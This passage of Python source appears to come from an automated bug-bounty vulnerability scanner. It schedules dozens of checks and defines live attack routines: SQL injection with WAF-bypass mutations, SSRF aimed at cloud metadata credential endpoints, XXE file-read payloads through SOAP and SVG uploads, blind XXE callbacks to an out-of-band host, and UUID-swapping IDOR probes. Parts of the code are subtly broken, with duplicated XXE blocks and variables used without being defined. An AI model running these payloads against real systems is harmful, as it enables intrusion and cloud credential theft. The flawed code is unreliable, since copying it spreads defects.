                    found.extend(check_oauth_pkce(targets))
                except Exception as _e: log.debug(f"oauth_pkce: {_e}")
            elif bug == "smuggling_te":
                try:
                    from engine.smuggling_deep import check_te_cl
                    found.extend(check_te_cl(targets))
                except Exception as _e: log.debug(f"smuggling_te: {_e}")
            elif bug == "smuggling_cl":
                try:
                    from engine.smuggling_deep import check_cl_te
                    found.extend(check_cl_te(targets))
                except Exception as _e: log.debug(f"smuggling_cl: {_e}")
            elif bug == "h2_smuggling":
                try:
                    from engine.h2_smuggling import check_h2_smuggling
                    found.extend(check_h2_smuggling(targets))
                except Exception as _e: log.debug(f"h2_smuggling: {_e}")
            elif bug == "supply_chain":
                try:
                    from engine.dep_confusion import check_dependency_confusion
                    found.extend(check_dependency_confusion(domain))
                except Exception as _e: log.debug(f"supply_chain: {_e}")
            elif bug == "cors_bypass":
                found.extend(check_cors_deep(targets, ends) if callable(globals().get("check_cors_deep")) else [])
            elif bug == "rate_limit":
                found.extend(_check_rate_limit(targets, ends))
            elif bug == "cookie_flags":
                found.extend(_check_cookie_flags(targets))
            elif bug == "cms_deep":
                found.extend(_check_cms_deep(targets))
            elif bug == "response_diff":
                # DISABLED: requires statistical baseline — too many FPs without it
                # TODO: re-enable when 3+ baseline requests are collected per endpoint
                log.debug("[response_diff] disabled — no baseline logic")
                pass
            elif bug == "xxe_oob":
                found.extend(_check_xxe_oob(targets, ends))
            elif bug == "nosqli_deep":
                found.extend(_check_nosqli_deep(targets, ends))
            elif bug == "http_desync":
                found.extend(_check_http_desync(targets))
            elif bug == "open_api":
                found.extend(_check_open_api_fuzz(targets, ends))
                try:
                    from engine.cors_deep import check_cors_advanced
                    found.extend(check_cors_advanced(targets))
                except Exception as _e: log.debug(f"cors_bypass: {_e}")
        except Exception as e:
            log.error(f"[custom] {bug}: {e}")
        return bug, found

    ALL_CUSTOM = {
        "expose","actuator","cors","graphql","saml","oauth","jwt","panels",
        "redirect","crlf","takeover","jsleak","xss","sqli","lfi","ssrf",
        "ssti","idor","xxe","rce","deserialization","prototype","fileupload",
        "buckets","nosqli","log4j","spring4shell","misconfig","smuggling",
        "cve","smartcve","ai_deep","stored_xss","host_header","race_condition",
        "websocket","business_logic","jwt_deep","ssrf_cloud","graphql_deep",
        "dep_confusion","mfa_bypass","smuggling_deep","cors_deep","takeover_deep",
        "ssti_deep",
        # ── New engines added (were missing -- caused silent skip) ──────────
        "bxss","cache_poison","graphql_chain","http2","mass_assign",
        "mfa_deep","oauth_deep","reset_poison","waf",
    }

    bugs_to_run = [b for b in bugs if b in ALL_CUSTOM]
    # ── APEX Brain: reorder bugs by tech + learned intelligence ──────────────
    # APEX: smart bug reordering by tech stack intelligence
    try:
        from engine.apex_brain import auto_select_bugs as _apex_reorder
        _tech_list  = list(tech_stack) if tech_stack else []
        _ep_sample  = list(ends)[:100]
        bugs_to_run = _apex_reorder(_tech_list, _ep_sample, bugs_to_run)
        log.info(f"[apex] reordered {len(bugs_to_run)} bugs by tech intel. Top: {bugs_to_run[:5]}")
    except Exception as _be:
        log.debug(f"[apex.reorder] {_be}")
    if _APEX:
        try:
            _brain = get_brain()
            _tech_list = list(tech_stack) if tech_stack else []
            _ep_sample = list(endpoints)[:50]
            bugs_to_run = _brain.auto_select_bugs(_tech_list, _ep_sample, bugs_to_run)
            _brain.log_decision("reorder", "bugs reordered by APEX intel",
                                {"tech": _tech_list[:3], "top": bugs_to_run[:5]})
        except Exception as _be:
            log.debug(f"[apex.brain] {_be}")

    # ── H1 Decision Engine: dynamic bug ordering from endpoint intelligence ─────
    # Uses pre-cached _tl.h1_ep_recs (built above, before scan loop).
    # Computes which bug types H1 has seen most on the top scored endpoints,
    # then pushes those bugs to the front of bugs_to_run.
    # Does NOT remove any bugs — fallback coverage is preserved.
    # Does NOT call DB here — reads from _tl cache only.
    try:
        from engine.h1_ingest import _normalise_endpoint as _h1ne
        _ep_recs = getattr(_tl, 'h1_ep_recs', {})
        _param_map = getattr(_tl, 'h1_param_map', {})

        if _ep_recs:
            # Collect bug types scored from all cached endpoint recs, weighted by score
            _bug_weights: dict = {}
            for _norm, _rec in _ep_recs.items():
                ep_h1_score = _tl.h1_score_map.get(_norm, 1.0)
                for _mb in _rec.get("matched_bugs", []):
                    _bt = _mb.get("bug_type","")
                    _sc = _mb.get("score", 0) * max(ep_h1_score / 100.0, 0.1)
                    if _bt in bugs_to_run:
                        _bug_weights[_bt] = _bug_weights.get(_bt, 0) + _sc

            # Also add weights from param intel across all top endpoints
            for _ep_url in ends[:30]:
                _qs = urllib.parse.parse_qs(urllib.parse.urlparse(_ep_url).query)
                for _pname in list(_qs.keys())[:5]:
                    for _bt in _param_map.get(_pname.lower(), []):
                        if _bt in bugs_to_run:
                            _bug_weights[_bt] = _bug_weights.get(_bt, 0) + 15.0

            if _bug_weights:
                # Reorder: H1-boosted bugs first (stable sort preserves APEX order for ties)
                _boosted  = sorted(
                    [b for b in bugs_to_run if b in _bug_weights],
                    key=lambda b: -_bug_weights.get(b, 0)
                )
                _baseline = [b for b in bugs_to_run if b not in _bug_weights]
                _orig_order = list(bugs_to_run)
                bugs_to_run = _boosted + _baseline

                # Decision log
                _top_boosts = sorted(_bug_weights.items(), key=lambda x: -x[1])[:5]
                log.info(f"[decision] H1 reordered bugs_to_run "
                         f"boosted={[b for b,_ in _top_boosts]} "
                         f"baseline={_baseline[:3]} ...")
                # Structured decision emit for UI
                _skipped_low = [b for b in _baseline if _bug_weights.get(b, 0) < 1]
                emit({"type": "h1_decision",
                      "boosted_bugs":  [b for b,_ in _top_boosts],
                      "baseline_bugs": _baseline[:5],
                      "ep_rec_count":  len(_ep_recs),
                      "param_signals": len(_bug_weights)})
            else:
                log.debug("[decision] H1 recs found but no matching bugs to boost")

        elif not _ep_recs:
            # No H1 data — also check param names across endpoints as lightweight signal
            _param_bug_hits: dict = {}
            for _ep_url in ends[:20]:
                _qs = urllib.parse.parse_qs(urllib.parse.urlparse(_ep_url).query)
                for _pname in list(_qs.keys())[:5]:
                    for _bt in _param_map.get(_pname.lower(), []):
                        if _bt in bugs_to_run:
                            _param_bug_hits[_bt] = _param_bug_hits.get(_bt, 0) + 1
            if _param_bug_hits:
                _param_boosted = sorted(
                    [b for b in bugs_to_run if b in _param_bug_hits],
                    key=lambda b: -_param_bug_hits.get(b, 0)
                )
                _param_base = [b for b in bugs_to_run if b not in _param_bug_hits]
                bugs_to_run = _param_boosted + _param_base
                log.info(f"[decision] param-only boost (no H1 recs): "
                         f"{list(_param_bug_hits.items())[:4]}")

    except Exception as _dec_e:
        log.debug(f"[decision] H1 engine error (fallback to current order): {_dec_e}")

    log.info(f"[scan] {len(bugs_to_run)} checks | speed={scan_speed} | workers={SPEED['workers']}")
    # Debug: show endpoint param distribution so silent-skip issues are visible
    _ep_with_eq   = sum(1 for e in ends if '=' in e)
    _ep_injectable = len(param_ends)
    _ep_no_param  = len(ends) - _ep_with_eq
    log.info(f"[debug] endpoint breakdown: total={len(ends)} injectable={_ep_injectable} "
             f"has_eq_but_static={_ep_with_eq - _ep_injectable} no_param={_ep_no_param}")
    log.info(f"[debug] param modules (xss/sqli/ssrf/lfi/ssti/redirect) "
             f"will test {min(_ep_injectable, max(30,int(100*SPEED['ends_mul'])))} endpoints each")

    # Progress ping thread -- keeps SSE alive during long scans
    _ping_stop = threading.Event()
    def _ping_worker():
        while not _ping_stop.is_set():
            time.sleep(10)
            if not _ping_stop.is_set():
                done_count = sum(1 for b in bugs_to_run if counts.get(b,0) >= 0)
                emit({"type":"scan_progress",
                      "done": sum(1 for b in bugs_to_run if b in _completed_bugs),
                      "total": len(bugs_to_run),
                      "active": list(_active_bugs)[:3]})
    _completed_bugs = set()
    _active_bugs    = set()
    _ping_t = threading.Thread(target=_ping_worker, daemon=True)
    _ping_t.start()

    # ── Streaming endpoint set: shared state for parallel recon absorption ────
    # run_custom() runs in parallel threads via ThreadPoolExecutor. When recon is
    # running in parallel it keeps writing new endpoints to DB. Each bug invocation
    # merges new DB entries into ends/param_ends before building its end_cap.
    # Lock ensures thread-safe mutation of the shared ends/param_ends lists.
    _stream_lock     = threading.Lock()
    _stream_seen     = set(ends)   # URLs already in current snapshot
    _stream_last_log = [len(ends)] # mutable for closure — last logged count

    def _refresh_endpoints_for_bug(bug_label: str) -> None:
        """Merge any new endpoints written by recon since scan start."""
        if not db:
            return
        try:
            _fresh = db.get_endpoints(domain, limit=20000)
            with _stream_lock:
                _added = []
                for _fu in _fresh:
                    if _fu not in _stream_seen:
                        _stream_seen.add(_fu)
                        ends.append(_fu)
                        if _is_injectable(_fu):
                            param_ends.append(_fu)
                        _added.append(_fu)
                if _added:
                    _new_total = len(ends)
                    log.info(f"[stream] bug={bug_label}: +{len(_added)} new endpoints absorbed "
                             f"from parallel recon (total {_stream_last_log[0]} → {_new_total})")
                    emit({"type": "log",
                          "msg": f"[stream] +{len(_added)} endpoints from parallel recon absorbed before {bug_label}",
                          "status": "ok"})
                    _stream_last_log[0] = _new_total
        except Exception as _sre:
            log.debug(f"[stream] refresh error for {bug_label}: {_sre}")

    try:
        # Run custom detection rules first
        if db:
            try:
                _run_custom_rules(domain, db, q, targets, ends)
            except Exception as _cre:
                log.debug(f"[custom_rules] error: {_cre}")

        _scan_exe = ThreadPoolExecutor(max_workers=SPEED["workers"])
        futs = {_scan_exe.submit(run_custom, b): b for b in bugs_to_run}
        try:
            for fut in as_completed(futs, timeout=int(1800 * SPEED.get("timeout_mul", 1.0))):
                bug = futs[fut]
                _active_bugs.discard(bug)
                try:
                    b, found = fut.result(timeout=int(BUG_TIMEOUTS.get(bug, 120) * SPEED.get("timeout_mul", 1.0)))
                    for f in found:
                        # Auto-validate finding (xbow-style)
                        if _USE_VALIDATOR and b in ("xss","sqli","lfi","ssrf","ssti","rce"):
                            try:
                                confirmed, reason = _validate_finding(f)
                                if not confirmed:
                                    f["confidence"] = max(1, int(f.get("confidence",50)) - 20)
                                    f["_validation"] = f"FP_risk:{reason}"
                                    if f.get("confidence",50) < 35:
                                        log.debug(f"[validator] FP filtered: {b} @ {f.get('url','')[:60]} ({reason})")
                                        continue
                                else:
                                    f["confidence"] = min(99, int(f.get("confidence",50)) + 10)
                                    f["_validation"] = f"confirmed:{reason}"
                            except Exception as _ve:
                                log.debug(f"[validator] error: {_ve}")
                        counts[b] += 1
                        save(f, b)
                    _completed_bugs.add(b)
                    _pct = round(len(_completed_bugs) / max(len(bugs_to_run), 1) * 100)
                    emit({"type":"scan_done","bug":b,"count":counts.get(b,0),
                          "progress_pct":_pct,
                          "sev":"critical" if any(f.get("severity")=="critical" for f in found)
                                else "high" if any(f.get("severity")=="high" for f in found)
                                else "medium" if found else ""})
                    log.info(f"[scan] {b}: {counts.get(b,0)} findings")
                except _TimeoutError:
                    log.warning(f"[scan] {bug} timed out after {BUG_TIMEOUTS.get(bug,120)}s")
                    _completed_bugs.add(bug)
                    emit({"type":"scan_done","bug":bug,"count":0,"note":"timed out"})
                    pass  # timeout handled via BUG_TIMEOUTS cap above
                except Exception as e:
                    log.error(f"[scan] {bug}: {e}")
                    _completed_bugs.add(bug)
                    emit({"type":"scan_done","bug":bug,"count":0})
        except Exception as outer_e:
            log.warning(f"[scan] outer loop stopped: {outer_e}")
            for _sf in futs:
                if not _sf.done(): _sf.cancel()
            for b in bugs_to_run:
                if b not in _completed_bugs:
                    emit({"type":"scan_done","bug":b,"count":counts.get(b,0),
                          "note":"overall timeout"})
                    _completed_bugs.add(b)
        finally:
            _scan_exe.shutdown(wait=False)
    finally:
        _ping_stop.set()

    # Wait for nuclei background task to finish (max 60s)
    if nuclei_future:
        try:
            nuclei_future.result(timeout=60)
            log.info("[scan] nuclei background task complete")
        except Exception as e:
            log.warning(f"[scan] nuclei background: {e}")
        try: _nuclei_exe.shutdown(wait=False)
        except: pass

    # ── APEX: persist knowledge graph at scan end ────────────────────────────
    if _APEX:
        try:
            end_session()
            _g = get_graph(domain)
            for _f in db.get_findings(domain):
                _g.add_finding(_f.get("url",""), _f.get("bug",""),
                               _f.get("severity",""), _f.get("description",""))
            _g.save()
            log.info(f"[apex.graph] {len(_g.nodes)} nodes saved")
        except Exception as _ae:
            log.debug(f"apex end: {_ae}")

    # ── Phase 5: Exploitation chain detection + notification ───────────────
    try:
        from engine.chain import find_chains
        all_findings = db.get_findings(domain)
        chains = find_chains(all_findings)
        if chains:
            db.save_chains(domain, chains)
            emit({"type":"chains_found","count":len(chains),
                  "chains":[{"id":c["id"],"name":c["name"],
                             "severity":c["severity"]} for c in chains]})
            if notifier:
                for c in chains:
                    notifier.queue_chain(c, domain)
    except Exception as e:
        log.warning(f"chain detection: {e}")

    # ── Done ───────────────────────────────────────────────────────────────
    for bug in bugs:
        emit({"type":"scan_done","bug":bug,"count":counts.get(bug,0)})

    total = sum(counts.values())
    _all_finds = db.get_findings(domain)
    crits = sum(1 for f in _all_finds if f.get("severity")=="critical")

    if notifier:
        try: notifier.send_scan_complete(domain, total, crits, findings=_all_finds)
        except: pass

    # ── Auto-generate Nuclei templates from critical/high findings ────────────
    if _ELITE_ENGINES:
        try:
            _all_finds = db.get_findings(domain)
            _templates = generate_from_scan_results(_all_finds)
            if _templates:
                emit({"type":"nuclei_templates","count":len(_templates),
                      "files":[t["filename"] for t in _templates]})
                log.info(f"[scan] nuclei auto-gen: {len(_templates)} templates")
        except Exception as _nge:
            log.debug(f"nuclei auto-gen: {_nge}")

        # ── Activity Feed: detach ────────────────────────────────────────────────
    try:
        from engine import activity_feed as _af
        _af.detach()
    except Exception: pass

    # ── APEX Brain: chain detection at scan end ──────────────────────────────
    try:
        from engine.apex_brain import detect_chains, end_session as _end_sess, enrich_findings_with_next_steps
        _all_finds = db.get_findings(domain)
        _chains    = detect_chains(_all_finds)
        if _chains:
            db.save_chains(domain, _chains)
            emit({"type":"chains_found","chains":_chains,
                  "count":len(_chains),"critical":sum(1 for c in _chains if c.get("severity")=="critical")})
            log.info(f"[scan] APEX: {len(_chains)} exploit chains detected")
        # Enrich every finding with next_attack_step[] — surfaces per-card in UI
        try:
            _enriched = enrich_findings_with_next_steps(_all_finds)
            log.info(f"[scan] next_attack_step enriched {len(_enriched)} findings")
            emit({"type":"findings_enriched","count":len(_enriched)})
        except Exception as _nse:
            log.debug(f"[apex_brain] next_steps: {_nse}")
        _end_sess(domain)
    except Exception as _ce:
        log.debug(f"[apex_brain] chain detect: {_ce}")

    # Persist brain stats
    try:
        from engine.agentic_loop import get_brain_stats as _gbs
        _bs = _gbs()
        log.info(f"[brain] {_bs.get('total_hits',0)} total hits across {_bs.get('domains_scanned',0)} domains")
    except Exception: pass
    emit({"type":"scan_all_done","total":total,"crits":crits})
    # TASK 5 — Record scan duration for avg calculation
    try:
        record_scan_duration(time.time() - _scan_t0)
    except Exception:
        pass
    log.info(f"[scan] DONE -- {total} findings ({crits} critical) across {len(bugs)} bug types")

    # ── Phase 7: Auto-report generation ──────────────────────────────────────
    if total > 0:
        try:
            from pathlib import Path as _RPPath
            _report_dir = _RPPath(__file__).parent / "data" / "reports" / domain
            _report_dir.mkdir(parents=True, exist_ok=True)
            import time as _rt, json as _rj
            _ts = int(_rt.time())
            _findings = db.get_findings(domain) or []
            _crits_l  = [f for f in _findings if f.get("severity","") == "critical"]
            _highs_l  = [f for f in _findings if f.get("severity","") == "high"]
            _report = {
                "domain":    domain,
                "generated": _ts,
                "total":     len(_findings),
                "critical":  len(_crits_l),
                "high":      len(_highs_l),
                "medium":    sum(1 for f in _findings if f.get("severity","") == "medium"),
                "low":       sum(1 for f in _findings if f.get("severity","") == "low"),
                "findings":  _findings[:500],   # cap for file size
            }
            _report_path = _report_dir / f"scan_{_ts}.json"
            _report_path.write_text(_rj.dumps(_report, indent=2, default=str))
            log.info(f"[report] generated: {_report_path} ({total} findings)")
            emit({"type":    "report_ready",
                  "domain":  domain,
                  "path":    str(_report_path),
                  "total":   total,
                  "critical": crits})
        except Exception as _rep_err:
            log.warning(f"[report] auto-generation failed: {_rep_err}")


def check_sqli_bypass(endpoints: List[str]) -> List[dict]:
    """SQLi with full wordlist + WAF bypass mutations."""
    _waf = _tl_waf()   # per-thread WAF info
    findings = []

    # Full SQLI_PAYLOADS + SecLists wordlist
    wl = _load_sqli_wordlist()
    all_payloads = list(SQLI_PAYLOADS)
    for item in wl:
        if item not in all_payloads:
            all_payloads.append(item)
    # Prepend H1-observed SQLi payloads (proven effective in real disclosures)
    _h1_sqli = _tl_h1_payloads("sqli")
    if _h1_sqli:
        _h1_as_tuples = [(p, []) for p in _h1_sqli if (p,) not in
                         {(x[0],) for x in all_payloads if isinstance(x, tuple)}]
        all_payloads = _h1_as_tuples + all_payloads
        log.info(f"[sqli] H1 payloads prepended: {len(_h1_as_tuples)} → {len(all_payloads)} total")
    # Payload intelligence: prepend ranked canonical SQLi payloads
    try:
        from engine.payload_intel import select_payloads as _pi_sel_sqli
        _pi_sqli_raw = _pi_sel_sqli("sqli", transport="query", top_n=8)
        _existing_literals = {x[0] for x in all_payloads if isinstance(x, tuple)}
        _pi_sqli = [(p, []) for p in _pi_sqli_raw if p not in _existing_literals]
        if _pi_sqli:
            all_payloads = _pi_sqli + all_payloads
            log.info(f"[sqli] payload_intel: {len(_pi_sqli)} ranked payloads prepended")
    except Exception: pass

    # Apply WAF bypass mutations if WAF detected
    if _waf.get("detected"):
        try:
            from engine.mutator import get_mutator
            mut = get_mutator()
            mut._waf_vendor = _waf_info.get("vendor","unknown")
            extra = []
            for payload, errors in all_payloads[:8]:
                variants = mut.mutate(payload, context="sqli")
                for v in variants[1:3]:
                    extra.append((v, errors))
            all_payloads = extra + all_payloads
        except Exception as e:
            log.debug(f"sqli bypass: {e}")

    ALL_SQL_ERRORS = [
        "SQL syntax","mysql_fetch","ORA-","SQLSTATE","Warning: mysql",
        "Unclosed quotation","Incorrect syntax","SqlException","PSQLException",
        "SQLite error","pg_query","unrecognized token","You have an error",
        "supplied argument is not","mysql_num_rows",
    ]

    tested = set()
    for ep in endpoints[:400]:
        if "=" not in ep: continue
        try:
            parsed = urllib.parse.urlparse(ep)
            qs = urllib.parse.parse_qs(parsed.query)
        except: continue
        for param in list(qs.keys())[:3]:
            key = (ep.split("?")[0], param)
            if key in tested: continue
            tested.add(key)
            baseline = _get_b(ep, timeout=6)
            base_len = len(baseline[2]) if baseline else 0
            for payload, errors in all_payloads[:15]:
                if _cancelled(): break
                nq = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                if not errors:  # time-based
                    start = time.time()
                    r = _get_b(test, timeout=8)
                    elapsed = time.time() - start
                    if elapsed > 4.5:
                        findings.append(F("sqli","critical",ep,
                            f"Time-based blind SQLi in '{param}' ({elapsed:.1f}s delay)",
                            param=param, payload=payload,
                            poc=f"sqlmap -u '{ep}' -p {param} --technique=T --batch",
                            waf_bypassed=_waf_info.get("detected",False),
                            impact="Full database read/write, authentication bypass",
                            remediation="Use parameterized queries everywhere."))
                        break
                else:
                    r = _get_b(test, timeout=8)
                    if not r: continue
                    body = r[2]
                    matched = [e for e in (errors + ALL_SQL_ERRORS)
                               if e.lower() in body.lower()]
                    if matched:
                        findings.append(F("sqli","critical",ep,
                            f"Error-based SQLi in '{param}'",
                            param=param, payload=payload,
                            error_detected=matched[:2],
                            preview=body[:300],
                            poc=f"sqlmap -u '{ep}' -p {param} --dbs --batch",
                            waf_bypassed=_waf_info.get("detected",False),
                            impact="Full database read/write, authentication bypass",
                            remediation="Use parameterized queries everywhere."))
                        break
    return findings


# ── OOB-aware SSRF ────────────────────────────────────────────────────────────
def check_ssrf_oob(endpoints: List[str], oob_host: str = "") -> List[dict]:
    """SSRF with OOB callback confirmation."""
    findings = []
    params = ["url","target","dest","redirect","uri","path","site","html",
              "host","to","out","view","dir","show","open","fetch","load",
              "src","href","img","source","resource","next","image","data",
              "callback","return","forward","jump","link","file","page","ref"]
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::]:80/",
        "dict://127.0.0.1:6379/",
        "file:///etc/passwd",
    ]
    if oob_host:
        payloads.insert(0, f"http://{oob_host}/ssrf-confirm")

    SIGS = ["ami-id","instance-id","security-credentials","computeMetadata",
            "root:x:","localhost","PING","metadata","instanceId"]

    tested = set()
    for ep in endpoints[:300]:
        if "=" not in ep: continue
        try:
            parsed = urllib.parse.urlparse(ep)
            qs = urllib.parse.parse_qs(parsed.query)
        except: continue
        for param in params:
            if param not in qs: continue
            key = (ep.split("?")[0], param)
            if key in tested: continue
            tested.add(key)
            for payload in payloads[:8]:
                nq = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                r = _get_b(test, timeout=10)
                if not r: continue
                status, hdrs, body = r
                if status == 200 and any(s.lower() in body.lower() for s in SIGS):
                    findings.append(F("ssrf","critical",ep,
                        f"SSRF via '{param}' -- internal service reached",
                        param=param,payload=payload,
                        preview=body[:400],
                        poc=f"curl '{test}'",
                        oob_host=oob_host,
                        impact="AWS/GCP metadata access, cloud credential theft → full cloud compromise"))
                    break

    # ── SOAP XXE ─────────────────────────────────────────────────────────────
    SOAP_XXE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><test>&xxe;</test></soapenv:Body>
</soapenv:Envelope>"""

    SOAP_PATHS = [e for e in endpoints[:500] 
                  if any(p in e.lower() for p in ['.asmx','.svc','/soap','/wsdl','/service'])]

    for ep in SOAP_PATHS[:10]:
        r = _req(ep, "POST",
                headers={"Content-Type": "text/xml; charset=utf-8",
                         "SOAPAction": ""},
                data=SOAP_XXE.encode(), timeout=8)
        if r and any(s in r[2] for s in ["root:","daemon:","bin:","nobody:"]):
            findings.append(F("xxe","critical",ep,
                f"XXE via SOAP endpoint -- /etc/passwd disclosed",
                preview=r[2][:400],
                poc=f"curl -X POST '{ep}' -H 'Content-Type:text/xml' -d '{SOAP_XXE[:100]}...'",
                impact="XXE in SOAP service -- local file read, SSRF, potential RCE",
                remediation="Disable external entity processing. Use FEATURE_SECURE_PROCESSING.",
                confidence=96))

    # ── SVG Upload XXE ────────────────────────────────────────────────────────
    SVG_XXE = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        b'<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>\n'
    )
    UPLOAD_EPS = [e for e in endpoints[:500] 
                  if any(p in e.lower() for p in ['upload','import','file','avatar','image','photo'])]
    
    for ep in UPLOAD_EPS[:10]:
        import io as _io
        boundary = b"bugscanXXE"
        crlf = b"\r\n"
        body = (b"--" + boundary + crlf +
                b"Content-Disposition: form-data; name=\"file\"; filename=\"xxe.svg\"" + crlf +
                b"Content-Type: image/svg+xml" + crlf + crlf +
                SVG_XXE + crlf +
                b"--" + boundary + b"--" + crlf)
        r = _req(ep,"POST",
                headers={"Content-Type":f"multipart/form-data; boundary={boundary.decode()}"},
                data=body, timeout=8)
        if r and any(s in r[2] for s in ["root:","daemon:","/etc","bin:"]):
            findings.append(F("xxe","critical",ep,
                f"XXE via SVG file upload -- file system read confirmed",
                preview=r[2][:300],
                poc=f"Upload SVG with XXE payload to {ep}",
                impact="SVG XXE -- read server files, SSRF to internal network",
                remediation="Sanitize SVG uploads. Disable XML entity expansion.",
                confidence=94))


    # ── SOAP endpoint XXE ──────────────────────────────────────────────────────
    SOAP_PATHS = [e for e in endpoints[:500]
                  if any(p in e.lower() for p in ['.asmx','.svc','/soap','/wsdl','/service'])]
    SOAP_XXE_PAYLOAD = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        '<soapenv:Body><test>&xxe;</test></soapenv:Body>'
        '</soapenv:Envelope>'
    )
    for ep in SOAP_PATHS[:10]:
        r = _req(ep, "POST",
                 headers={"Content-Type": "text/xml; charset=utf-8", "SOAPAction": ""},
                 data=SOAP_XXE_PAYLOAD.encode(), timeout=8)
        if r and any(s in r[2] for s in ["root:","daemon:","bin:","nobody:"]):
            findings.append(F("xxe","critical",ep,
                "XXE via SOAP endpoint -- /etc/passwd read confirmed",
                poc=f"curl -X POST '{ep}' -H 'Content-Type: text/xml' -d '<xxe payload>'",
                preview=r[2][:400],
                impact="SOAP XXE -- arbitrary file read, SSRF, potential credential exposure",
                remediation="Disable external entity processing in SOAP XML parser.",
                confidence=97))

    # ── Image/file upload XXE (SVG, DOCX, ODT) ────────────────────────────────
    UPLOAD_EPS = [e for e in endpoints[:500]
                  if any(p in e.lower() for p in ['upload','import','avatar','image','file','photo','doc'])]
    SVG_PAYLOAD = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
    )
    for ep in UPLOAD_EPS[:8]:
        boundary = b"bugscanXXE"
        crlf = b"\r\n"
        body = (b"--" + boundary + crlf +
                b'Content-Disposition: form-data; name="file"; filename="test.svg"' + crlf +
                b"Content-Type: image/svg+xml" + crlf + crlf +
                SVG_PAYLOAD + crlf +
                b"--" + boundary + b"--" + crlf)
        r = _req(ep, "POST",
                 headers={"Content-Type": f"multipart/form-data; boundary={boundary.decode()}"},
                 data=body, timeout=8)
        if r and any(s in r[2] for s in ["root:","daemon:","/etc","bin:"]):
            findings.append(F("xxe","critical",ep,
                "XXE via SVG upload -- file read confirmed",
                poc=f"Upload SVG with XXE payload to {ep}",
                preview=r[2][:300],
                impact="SVG XXE on upload endpoint -- read server files, SSRF",
                remediation="Sanitize SVG uploads. Disable external entities in image processors.",
                confidence=95))

    # ── OOB XXE (blind) ───────────────────────────────────────────────────────
    if oob_host:
        OOB_PAYLOAD = (
            f'<?xml version="1.0"?><!DOCTYPE foo '
            f'[<!ENTITY % xxe SYSTEM "http://{oob_host}/xxe">%xxe;]><foo/>'
        )
        for ep in targets[:20]:
            r = _req(ep, "POST",
                     headers={"Content-Type": "application/xml"},
                     data=OOB_PAYLOAD.encode(), timeout=6)
            if r and r[0] not in (400, 404, 405):
                findings.append(F("xxe","high",ep,
                    f"Potential blind XXE -- OOB callback sent to {oob_host}",
                    poc=f"curl -X POST '{ep}' -H 'Content-Type: application/xml' -d '{OOB_PAYLOAD[:80]}'",
                    impact="Blind XXE -- check OOB host for DNS/HTTP callback",
                    remediation="Disable external entity processing.",
                    confidence=50, pattern_only=True))

    return findings


# ── OOB-aware XXE ─────────────────────────────────────────────────────────────
def check_xxe_oob(endpoints: List[str], targets: List[str],
                  oob_host: str = "") -> List[dict]:
    """XXE with OOB exfiltration."""
    findings = []
    payloads = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
         ["root:x:","root:!:","daemon:"]),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
         ["localhost","kali","ubuntu"]),
    ]
    if oob_host:
        payloads.insert(0, (
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_host}/xxe">]><foo>&xxe;</foo>',
            []  # OOB -- confirmed via DNS callback
        ))

    for url in targets[:30]:
        for payload, sigs in payloads:
            r = _req(url, "POST",
                    headers={"Content-Type":"application/xml","Accept":"*/*"},
                    data=payload.encode(), timeout=10)
            if not r: continue
            if sigs and any(s in r[2] for s in sigs):
                findings.append(F("xxe","critical",url,
                    "XXE confirmed -- file read",
                    payload=payload[:100],preview=r[2][:300],
                    poc=f"curl -X POST {url} -H 'Content-Type: application/xml' -d '{payload[:80]}'",
                    oob_host=oob_host,
                    impact="Read arbitrary files, SSRF, cloud metadata access"))
                break
            elif not sigs and r[0] == 200 and oob_host:
                findings.append(F("xxe","high",url,
                    "XXE -- OOB request triggered (check interactsh)",
                    payload=payload[:100],
                    oob_host=oob_host,
                    note="Verify OOB callback in interactsh dashboard"))
                break

    # ── BOLA: UUID-based IDOR ─────────────────────────────────────────────────
    import re as _ire
    UUID_PATTERN = _ire.compile(
        r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', _ire.I)
    
    uuid_eps = [(ep, UUID_PATTERN.findall(ep)) 
                for ep in endpoints[:500] if UUID_PATTERN.search(ep)]
    
    for ep, uuids in uuid_eps[:30]:
        baseline = _get(ep, timeout=6)
        if not baseline or baseline[0] != 200: continue
        
        # Try a different UUID (sequential IDORs are rare with UUID, but nil/zero UUIDs work)
        test_uuids = [
            "00000000-0000-0000-0000-000000000000",  # nil UUID
            "00000000-0000-0000-0000-000000000001",  # near-zero
            uuids[0][:-1] + ("0" if uuids[0][-1] != "0" else "1"),  # flip last char
        ]
        for test_uuid in test_uuids[:2]:
            test_url = ep
            for u in uuids:
                test_url = test_url.replace(u, test_uuid, 1)
            if test_url == ep: continue
            
            r2 = _get(test_url, timeout=6)
            if not r2 or r2[0] != 200: continue
            # Different content but same structure = IDOR
            if (abs(len(r2[2]) - len(baseline[2])) < len(baseline[2]) * 0.5 and
